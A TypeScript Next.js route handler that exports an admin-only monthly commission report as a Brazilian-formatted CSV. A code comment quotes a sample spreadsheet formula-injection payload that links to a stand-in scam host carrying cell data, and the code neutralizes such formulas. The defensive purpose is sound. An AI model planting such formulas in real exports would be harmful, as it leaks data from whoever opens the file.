import { auth } from "@/auth";

const API_URL = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";

type ReportRow = {
  date: string;
  client: string;
  clientPhone: string;
  listingTitle: string;
  assetType: string;
  bank: string;
  financedAmount: number;
  commissionRate: number;
  commissionAmount: number;
  receiverKey: string;
  receiverName: string;
  receiverType: string;
  receiverDocument: string;
  receiverEmail: string;
  receiverPhone: string;
  rebatePercent: number;
  rebateAmount: number;
  netAmount: number;
  status: "registered" | "paid";
  paidAt: string;
  paidNote: string;
};

// Planilha pro Excel em português: separador ";" (o Excel do Brasil usa a
// vírgula como decimal), número com vírgula decimal e BOM UTF-8 pra os
// acentos abrirem certo ao dar dois cliques no arquivo.
//
// "Formula injection": sem neutralizeFormula, alguém cria um anúncio com
// título tipo `=HYPERLINK("http://golpe"&A1)` e, quando o admin abre este
// CSV no Excel/Sheets, a fórmula roda. Prefixar com "'" neutraliza sem
// mudar o que aparece na célula (Excel esconde o apóstrofo inicial).
function neutralizeFormula(text: string): string {
  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
}

function cell(value: string | number): string {
  const text = typeof value === "number" ? value.toFixed(2).replace(".", ",") : neutralizeFormula(value);
  return /[";\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

function toCsv(header: string[], rows: (string | number)[][]): string {
  return "﻿" + [header, ...rows].map((row) => row.map(cell).join(";")).join("\r\n") + "\r\n";
}

function dateBr(iso: string): string {
  return iso ? new Date(iso).toLocaleDateString("pt-BR", { timeZone: "America/Sao_Paulo" }) : "";
}

const STATUS = { registered: "A pagar", paid: "Pago" } as const;

// Fechamento mensal de comissões (ver RebatesService.monthlyReport).
// ?mes=AAAA-MM&tipo=detalhado|parceiros — detalhado é um negócio por linha;
// parceiros soma por quem recebe, com os dados pra fazer o Pix.
export async function GET(request: Request) {
  const session = await auth();
  if (!session?.user || session.user.role !== "admin") return new Response("Acesso restrito.", { status: 403 });

  const url = new URL(request.url);
  const month = url.searchParams.get("mes") ?? "";
  const kind = url.searchParams.get("tipo") === "parceiros" ? "parceiros" : "detalhado";
  if (!/^\d{4}-\d{2}$/.test(month)) return new Response("Informe o mês no formato AAAA-MM.", { status: 400 });

  const upstream = await fetch(`${API_URL}/admin/financing-report?month=${month}`, {
    headers: { Authorization: `Bearer ${session.accessToken}` },
    cache: "no-store",
  });
  if (!upstream.ok) return new Response("Não foi possível gerar o relatório agora.", { status: upstream.status });
  const rows = (await upstream.json()) as ReportRow[];

  let csv: string;
  if (kind === "detalhado") {
    csv = toCsv(
      [
        "Data", "Cliente", "Telefone do cliente", "Tipo", "Anúncio", "Banco", "Valor financiado", "Comissão %",
        "Comissão (R$)", "Parceiro", "Tipo de parceiro", "CPF/CNPJ do parceiro", "Repasse %", "Repasse (R$)",
        "Líquido NovoSeminovo (R$)", "Situação do repasse", "Pago em", "Observação do pagamento",
      ],
      rows.map((row) => [
        dateBr(row.date), row.client, row.clientPhone, row.assetType === "vehicle" ? "Veicular" : "Imobiliário",
        row.listingTitle, row.bank, row.financedAmount, row.commissionRate, row.commissionAmount, row.receiverName,
        row.receiverType, row.receiverDocument, row.rebatePercent, row.rebateAmount, row.netAmount, STATUS[row.status],
        dateBr(row.paidAt), row.paidNote,
      ]),
    );
  } else {
    const byReceiver = new Map<string, { first: ReportRow; deals: number; financed: number; rebate: number; toPay: number; paid: number }>();
    for (const row of rows) {
      const entry = byReceiver.get(row.receiverKey) ?? { first: row, deals: 0, financed: 0, rebate: 0, toPay: 0, paid: 0 };
      entry.deals++;
      entry.financed += row.financedAmount;
      entry.rebate += row.rebateAmount;
      if (row.status === "paid") entry.paid += row.rebateAmount;
      else entry.toPay += row.rebateAmount;
      byReceiver.set(row.receiverKey, entry);
    }
    const entries = [...byReceiver.values()].sort((a, b) => b.toPay - a.toPay);
    csv = toCsv(
      [
        "Parceiro", "Tipo", "CPF/CNPJ (chave Pix)", "E-mail", "Telefone", "Negócios no mês", "Volume financiado",
        "Repasse total (R$)", "Já pago (R$)", "A pagar (R$)",
      ],
      [
        ...entries.map((entry) => [
          entry.first.receiverName, entry.first.receiverType, entry.first.receiverDocument, entry.first.receiverEmail,
          entry.first.receiverPhone, String(entry.deals), entry.financed, entry.rebate, entry.paid, entry.toPay,
        ]),
        [
          "TOTAL", "", "", "", "", String(rows.length),
          entries.reduce((t, e) => t + e.financed, 0), entries.reduce((t, e) => t + e.rebate, 0),
          entries.reduce((t, e) => t + e.paid, 0), entries.reduce((t, e) => t + e.toPay, 0),
        ],
      ],
    );
  }

  return new Response(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="comissoes-${kind}-${month}.csv"`,
      "Cache-Control": "no-store",
    },
  });
}
